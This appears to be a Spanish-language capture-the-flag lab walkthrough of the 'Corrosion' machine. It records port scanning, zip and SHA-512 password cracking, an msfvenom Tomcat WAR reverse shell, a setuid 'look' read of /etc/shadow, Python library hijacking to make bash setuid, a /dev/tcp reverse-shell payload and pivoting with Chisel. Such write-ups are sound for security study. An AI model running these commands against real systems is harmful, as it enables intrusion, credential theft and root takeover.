
Identificamos el target en la red

```
 nmap -sn 192.168.1.1/24 
 
#Detectamos  
MAC Address: 0C:8E:29:AE:11:F9 (Arcadyan)
Nmap scan report for corrosion.home (192.168.1.91)

```

Hacemos un scaneo profundo del equipo para la identificacion de puertos 

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.91 -oG nmap/allPorts

Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: F8:54:F6:AF:4F:D8 (AzureWave Technology)

```

Hacemos un scan especifico para identificar algunas vulnerabilidades utilizando los scripts de nmap

```
nmap -p 22,80,8080 -sCV -O -Pn -n 192.168.1.91 -oN nmap/Target

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)
|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.53
MAC Address: F8:54:F6:AF:4F:D8 (AzureWave Technology)

```

Hacemos directory traversal a los dos servidores que encontramos
```
gobuster dir -u http://192.168.1.91/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml -t 20

No encontramos nada util

gobuster dir -u http://192.168.1.91:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,xml,zip -t 50

/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/backup.zip           (Status: 200) [Size: 33723]
/readme.txt           (Status: 200) [Size: 153]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/RELEASE-NOTES.txt    (Status: 200) [Size: 6898]
Progress: 1323342 / 1323342 (100.00%)


En el fichero readme.txt enconntramos un usuario randy al que le compartienron una pass 

Ademas encontramos un fichero backup.zip 

El backup.zip esta protegido con clave e intentaremos encontrar las passwort

fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

PASSWORD FOUND!!!!: pw == @administrator_hi5

Tambien podemos como alternativa obtener el hash de un .zip 

zip2john backup.zip > hash 

A partir de este hash utilizar jhon the ripper para descifrarlo 

john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])

@administrator_hi5 (backup.zip)     
Session completed. 


```

Entre los archivos que encontramos hacemos una busqueda de algun password

```
Descomprimimos el archivo en un directorio
unzip backup.zip -d backup 

Buscamos algun password entre los ficheros 

grep password ./backup/*
<user username="manager" password="melehifokivai" roles="manager-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>

```

Con los datos de admin entramos a la administracion del servidor de toncat donde pordemos subir archivos war

```
msfvenon -l payload | grep java

Encontrmos uno que nos permite una reverse shell

Creamos un payload en war para subirlo al servidor y nos permita conectarnos

msfvenon -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o reverse.war

Ese archino lo subimos al servidor y lo ejecutamos 

Primero nos ponemos a las escucha con nc o pwncat-cs

nc -lvnp 444

pwncat-cs -lp 4444   

```

Establecemos una conexion con la maquina nos moveremos al home y bscaremos archivos que podamos leer
```
find . 2>/dev/null
```

Reutilizaremos las passwords encontradas con los usuarios idenificados 

```
randy 
jaye   melehifokivai
```

En el home de jaye encontramos en File un fichero look con el bit s activo ye l propietario del mismo es root lo ejecutamos y nos permite pasarle parámetros string donde nos permitirá leer archivos que solo tienen permiso de escritura de root

```
look "" /etc/shadown

extreamos el hash del usuario randy
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
```

Identificar el tipo de hash que se utiliza
```
 echo '$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/' | hashid
Analyzing '$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/'
[+] SHA-512 Crypt 

```

Lo trataremos de descifrar de randy con hashcat

```
Probamos con rockyou.txt pero demoraba mucho asi que lo invertimos 
hashcat -m 1800 -a 0 hash_randy /usr/share/wordlists/rockyou.txt

-m 1800 indica que el hash que se utiliza es SHA-512 

Dentro de man hashcat podemos busacar los valores con /Hash type

tac /usr/share/wordlists/rockyou.txt rockyou_ivert.txt

mv rockyou_ivert.txt /usr/share/wordlists/rockyou_ivert.txt

hashcat -m 1800 -a 0 hash_randy /usr/share/wordlists/rockyou_ivert.txt

$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:07051986randy

randy pass 07051986randy
```

Hacemos un sudo -l para ver que permisos tiene randy
```
randy@corrosion:/home/jaye/Files$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py

```

Vemos que puede ejecutar con privilegios de root /home/randy/randombase64.py
pero no podemos editar este archivo pero llo revisasmos.
```
randy@corrosion:~$ ls -ld /home/randy/randombase64.py
-rwxr-xr-x 1 root root 210 Sep 20  2021 /home/randy/randombase64.py
randy@corrosion:~$ cat /home/randy/ 
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
randy@corrosion:~$
```

Vemos que manda a ejecutar la libreria  base64 por los que la buscaremos y veremos si podemos hacer algo en este archivo.

```
randy@corrosion:~$ find / -name base64.py 2>/dev/null
/usr/lib/python3.8/base64.py

Revisamos los permisos 
ls -ld /usr/lib/python3.8/base64.py

Al ver que lo podemos editar le agregamos las siguientes lineas 

import os

os.system("chmod u+s /bin/bash")
```

Luego ejecutamos el archivo  randombase64.py como sudo para que nos asigne el suid a /bin/bash

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py

luego revisamos si lo hizo
randy@corrosion:~$ ls -ld /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash

Ejecutamos la bash con privilegios
randy@corrosion:~$ bash -p
randy@corrosion:~# whoami
root

```

Seguimos enumerando para ver que mas podemos encontrar en la red
```
bash-5.0$ ip -br a
lo               UNKNOWN        127.0.0.1/8 ::1/128 
ens33            UNKNOWN        192.168.1.91/24 fe80::e5da:1a43:59f6:f573/64 
ens37            UNKNOWN        10.10.0.128/24 fe80::7dcf:b072:34e5:f001/64 

Detectamos que esta conectado a una  segunda red 10.10.0.128/24 
```


Hacemos un reconocimiento para detectar hosts acivos asi que nos creamos unos scripts para desde la maquina comprometida enumerar la red interna
[[Bash HostDisvovery]]

Hacemos un reconocimiento para ver puertos activos
[[Bash PortDiscovery]]

Detectamos nuestra ip y otra ip en la red interna y los puertos que estasn abiertos

```
HOST 10.10.0.128 ACTIVO
[+]HOST 10.10.0.129 ACTIVO   Host objetivo

bash-5.0# ./portDiscovery.sh 
[+] Host 10.10.0.128 - Port 8080 ACTIVO
[+] Host 10.10.0.128 - Port 22 ACTIVO
[+] Host 10.10.0.129 - Port 22 ACTIVO

bash-5.0# ./portDiscoveryFull.sh 
[+] Host 10.10.0.129 - Port 22 ACTIVO
[+] Host 10.10.0.129 - Port 80 ACTIVO


cmd=bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.0.128%2F4646%200%3E%261"
```

Tambien podemos descargarnos el ejecutable de nmap desde  https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64   Lo copiamos a la maquina comprometida y desde este le damos permisos de ejecucion y hacemos un escaneo de la nueva red encontrada. 

```
bash-5.0# ./nmap -sn 10.10.0.1/24
Nmap scan report for 10.10.0.129
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.099s latency).

Nmap scan report for corrosion (10.10.0.128)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.44 seconds

bash-5.0# ./nmap -Pn -n 10.10.0.129

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-24 08:24 MDT
Unable to find nmap-services!  Resorting to /etc/services
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.10.0.129
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.0034s latency).
Not shown: 1180 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:BB:27:78 (Unknown)

```


Teniendo esto que haremos pivoting de esta maquina para poder acceder a los puertos de la maquina objetivo  con la herraienta  Chisel    https://github.com/jpillora/chisel 

[[Chisel Ejemplo]]

Una vez podemos alcanzar los puertos de la maquina mas alejada mediante el pivoting de la maquina comprometida  pasamos a  enumerar y hacer todo el proceso a la nueva maquina objetivo pasando por la maquina 1 en este caso [[Corrosion1]]